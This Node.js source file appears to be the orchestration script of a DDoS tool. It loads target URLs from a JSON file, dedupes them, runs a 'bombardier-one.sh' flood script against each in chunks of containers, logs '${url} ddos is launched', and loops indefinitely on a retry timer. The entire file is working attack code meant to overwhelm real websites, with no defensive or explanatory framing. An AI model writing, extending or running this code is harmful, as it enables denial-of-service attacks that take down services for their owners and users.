const {
  warningLog,
  successLog,
  errorLog,
  logStatistics,
  chunking,
  getRetryTimeout,
  setRunningAsync
} = require("./helpers");

const config = require("./config");
const { exec } = require("child_process");

const stoppedStr = "has been stopped";
const launchedStr = "has been launched";

const retry = async () => {
  console.log("Start checking URLs");
  const urls = require("./urls.json");
  const uniqueUrls = [];
  for (const url of urls) {
    if (!uniqueUrls.some((it) => it === url)) {
      uniqueUrls.push(url);
    }
  }

  let proceeded = 0;
  let launched = 0;
  let areNotAvailable = 0;
  let stopped = 0;

  const runImages = (chunk) => {
    return new Promise((resolve, reject) => {
      for (const url of chunk) {
        if (url) {
          exec(
            `sh ${__dirname}/bombardier-one.sh ${url} ${config.containersLimit}`,
            (error, stdout, stderr) => {
              proceeded++;

              logStatistics({
                uniqueUrls,
                launched,
                areNotAvailable,
                proceeded,
                stopped,
              });

              if (error) {
                errorLog(`error: ${error.message.toString()}`);
              }
              if (stderr) {
                if (
                  stderr.toString().toLowerCase().indexOf("warning:") !== -1
                ) {
                  warningLog(`stderr: ${stderr.toString()}`);
                } else {
                  errorLog(`stderr: ${stderr.toString()}`);
                }
              }
              if (!error && !stderr) {
                const out = stdout.toString();
                if (out.indexOf(launchedStr) !== -1) {
                  launched++;
                  successLog(out);
                  successLog(`${url} ddos is launched`);
                } else {
                  areNotAvailable++;
                  warningLog(out);
                }

                if (stdout.indexOf(stoppedStr) !== -1) {
                  stopped++;
                }
              }
            }
          );
        }
      }
      setTimeout(() => {
        resolve(true);
      }, 2000);
    });
  };

  const chunksUrls = chunking(uniqueUrls);
  for (const chunk of chunksUrls) {
    await runImages(chunk);
  }
  await setRunningAsync();
  setTimeout(retry, getRetryTimeout());
};

retry();
